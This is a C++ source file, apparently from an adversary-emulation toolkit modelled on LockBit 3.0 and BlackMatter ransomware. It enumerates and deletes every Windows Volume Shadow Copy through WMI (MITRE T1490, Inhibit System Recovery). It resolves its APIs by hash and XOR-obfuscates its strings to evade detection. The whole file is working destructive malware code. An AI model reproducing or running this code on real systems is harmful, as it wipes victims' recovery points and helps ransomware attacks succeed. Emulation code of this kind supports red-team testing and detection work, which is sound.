#include "crypto/xor_obfuscation.hpp"
#include "tamper.hpp"
#include "logger.hpp"
#include "util/string_util.hpp"
#include <format>
#include <comdef.h>

namespace tamper {

void deleteDiscoveredShadowCopies(IEnumWbemClassObject* p_enum, IWbemServices* p_svc);

/*
 * DeleteShadowCopies:
 *      About:
 *          Performs WMI query "SELECT * FROM Win32_ShadowCopy" against the root/cimv2 namespace
 *          and deletes any discovered shadow copies. Shadow copy deletion is performed using the
 *          "Win32_ShadowCopy.ID='<discovered ID>'" filter for each discovered shadow copy ID.
 *          Key API calls for the WMI query and shadow copy deletion are as follows: CoInitializeEx, 
 *          IWbemLocator::ConnectServer, IWbemServices::ExecQuery, IWbemServices::DeleteInstance.
 *      Result:
 *          Deleted shadow copies
 *      MITRE ATT&CK Techniques:
 *          T1490: Inhibit System Recovery
 *          T1047: Windows Management Instrumentation
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf
 *          https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html
 *      Other References:
 *          https://learn.microsoft.com/en-us/windows/win32/wmisdk/example--getting-wmi-data-from-the-local-computer
 *          https://chuongdong.com/reverse%20engineering/2021/09/05/BlackMatterRansomware/#shadow-copies-deletion-through-wmi
 */
void DeleteShadowCopies() {
    DWORD error_code;
    FP_CoInitializeEx coInitializeEx = (FP_CoInitializeEx)winapi_helper::GetAPI(0xc1cd8ee6, XOR_WIDE_LIT(L"ole32.dll"), &error_code);
    if (coInitializeEx == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for CoInitializeEx. Error code"), error_code));
        return;
    }
    FP_CoInitializeSecurity coInitializeSecurity = (FP_CoInitializeSecurity)winapi_helper::GetAPI(0x428dffe1, XOR_WIDE_LIT(L"ole32.dll"), &error_code);
    if (coInitializeSecurity == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for CoInitializeSecurity. Error code"), error_code));
        return;
    }
    FP_CoCreateInstance coCreateInstance = (FP_CoCreateInstance)winapi_helper::GetAPI(0xbecc6920, XOR_WIDE_LIT(L"ole32.dll"), &error_code);
    if (coCreateInstance == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for CoCreateInstance. Error code"), error_code));
        return;
    }
    FP_CoSetProxyBlanket coSetProxyBlanket = (FP_CoSetProxyBlanket)winapi_helper::GetAPI(0x09c43946, XOR_WIDE_LIT(L"ole32.dll"), &error_code);
    if (coSetProxyBlanket == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for CoSetProxyBlanket. Error code"), error_code));
        return;
    }
    FP_CoUninitialize coUninitialize = (FP_CoUninitialize)winapi_helper::GetAPI(0x0145f84c, XOR_WIDE_LIT(L"ole32.dll"), &error_code);
    if (coUninitialize == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for CoUninitialize. Error code"), error_code));
        return;
    }

    IWbemLocator* p_wmi_loc = NULL;
    IWbemServices* p_svc = NULL;
    IEnumWbemClassObject* p_enum = NULL;

    // Initialize COM library
    HRESULT hr = coInitializeEx(NULL, COINIT_MULTITHREADED);
    if (hr == S_OK) {
        XorLogger::LogDebug(XOR_LIT("Initialized COM library"));
    } else if (hr == S_FALSE) {
        XorLogger::LogDebug(XOR_LIT("COM library already initialized on this thread."));
    } else {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to initialize COM library. HRESULT"), hr));
        return;
    }

    do {
        // Initialize COM process security
        hr = coInitializeSecurity(
            NULL,
            -1,
            NULL,
            NULL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY, // https://learn.microsoft.com/en-us/windows/win32/com/com-authentication-level-constants
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_DYNAMIC_CLOAKING,
            NULL
        );
        if (hr == S_OK) {
            XorLogger::LogDebug(XOR_LIT("Initialized COM security"));
        } else if (hr == RPC_E_TOO_LATE) {
            XorLogger::LogDebug(XOR_LIT("COM security already initialized on this thread."));
        } else {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to initialize COM security. HRESULT"), hr));
            break;
        }

        // Obtain the initial locator to WMI
        hr = coCreateInstance(
            CLSID_WbemAdministrativeLocator,
            NULL,
            CLSCTX_INPROC_SERVER,
            IID_IWbemLocator,
            (LPVOID*) &p_wmi_loc
        );
        if (hr == S_OK) {
            XorLogger::LogDebug(XOR_LIT("Obtained initial WMI locator"));
        } else {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to obtain initial WMI locator. HRESULT"), hr));
            break;
        }

        // Connect to WMI
        hr = p_wmi_loc->ConnectServer(
            _bstr_t(XOR_WIDE_LIT(L"ROOT\\CIMV2")),
            NULL, // current user
            NULL, // current security context
            NULL, // current locale
            WBEM_FLAG_CONNECT_USE_MAX_WAIT, // avoid hanging indefinitely
            NULL, // current domain
            NULL, // context
            &p_svc
        );
        if (hr == S_OK) {
            XorLogger::LogDebug(XOR_LIT("Connected to ROOT\\CIMV2 WMI namespace"));
        } else {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to connect to ROOT\\CIMV2. HRESULT"), hr));
            break;
        }

        // Set IWbemServices proxy security
        hr = coSetProxyBlanket(
            p_svc,
            RPC_C_AUTHN_WINNT,           // NTLMSSP authentication
            RPC_C_AUTHZ_NONE,            // no authorization
            NULL,                        // Server principal name 
            RPC_C_AUTHN_LEVEL_CALL,      // Authenticates only at the beginning of each remote procedure call
            RPC_C_IMP_LEVEL_IMPERSONATE, // server can impersonate client security context
            NULL,                        // use current proxy identity
            EOAC_NONE                    // no proxy capability flags
        );
        if (hr == S_OK) {
            XorLogger::LogDebug(XOR_LIT("Set IWbemServices proxy security"));
        } else {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to set IWbemServices proxy security. HRESULT"), hr));
            break;
        }

        // Execute the WMI query "SELECT * FROM Win32_ShadowCopy"
        hr = p_svc->ExecQuery(
            _bstr_t(XOR_WIDE_LIT(L"WQL")), 
            _bstr_t(XOR_WIDE_LIT(L"SELECT * FROM Win32_ShadowCopy")),
            WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, 
            NULL, // context
            &p_enum
        );
        if (hr == S_OK) {
            XorLogger::LogDebug(XOR_LIT("Executed WMI query: SELECT * FROM Win32_ShadowCopy"));
        } else {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to execute WMI query. HRESULT"), hr));
            break;
        }

        // Process query results and delete discovered shadow copies
        deleteDiscoveredShadowCopies(p_enum, p_svc);
    } while (false);

    // Cleanup
    if (p_wmi_loc != NULL) {
        p_wmi_loc->Release();
    }
    if (p_svc != NULL) {
        p_svc->Release();
    }
    if (p_enum != NULL) {
        p_enum->Release();
    }
    coUninitialize();
}

void deleteDiscoveredShadowCopies(IEnumWbemClassObject* p_enum, IWbemServices* p_svc) {
    IWbemClassObject* p_obj = NULL;
    LPCWSTR id_str_template = L"%s='%s'";
    wchar_t id_str_buf[128];

    // Enumerate shadow copies
    while (true) {
        ULONG num_ret = 0;
        HRESULT hr = p_enum->Next(
            WBEM_INFINITE,
            1,
            &p_obj,
            &num_ret
        );
        if (hr == WBEM_S_FALSE) {
            // Finished enumerating
            XorLogger::LogDebug(XOR_LIT("Finished enumerating shadow copies."));
            break;
        } else if (hr != WBEM_S_NO_ERROR) {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to enumerate query results. HRESULT"), hr));
            break;
        }
        if (num_ret == 0) {
            // Finished enumerating
            XorLogger::LogDebug(XOR_LIT("Finished enumerating shadow copies."));
            break;
        }

        VARIANT vt_prop;
        hr = p_obj->Get(L"ID", 0, &vt_prop, NULL, NULL);
        if (hr == S_OK) {
            std::string copy_id = string_util::wstring_to_string(std::wstring(vt_prop.bstrVal, SysStringLen(vt_prop.bstrVal)));
            XorLogger::LogDebug(std::format("{}: {}", XOR_LIT("Found shadow copy with ID"), copy_id));

            // Delete shadow copy
            std::memset(id_str_buf, 0, sizeof(id_str_buf));
            swprintf_s(id_str_buf, sizeof(id_str_buf), id_str_template, XOR_WIDE_LIT(L"Win32_ShadowCopy.ID"), vt_prop.bstrVal);
            hr = p_svc->DeleteInstance(_bstr_t(id_str_buf), 0, NULL, NULL);
            if (hr == S_OK) {
                XorLogger::LogDebug(std::format("{}: {}", XOR_LIT("Deleted shadow copy with ID"), copy_id));
            } else {
                XorLogger::LogError(std::format("{} {}. HRESULT: {}", XOR_LIT("Failed to delete shadow copy with ID"), copy_id, hr));
            }
        } else {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get shadow copy ID. HRESULT"), hr));
        }

        VariantClear(&vt_prop);
        if (p_obj != NULL) {
            p_obj->Release();
        }
    }
}

} // namespace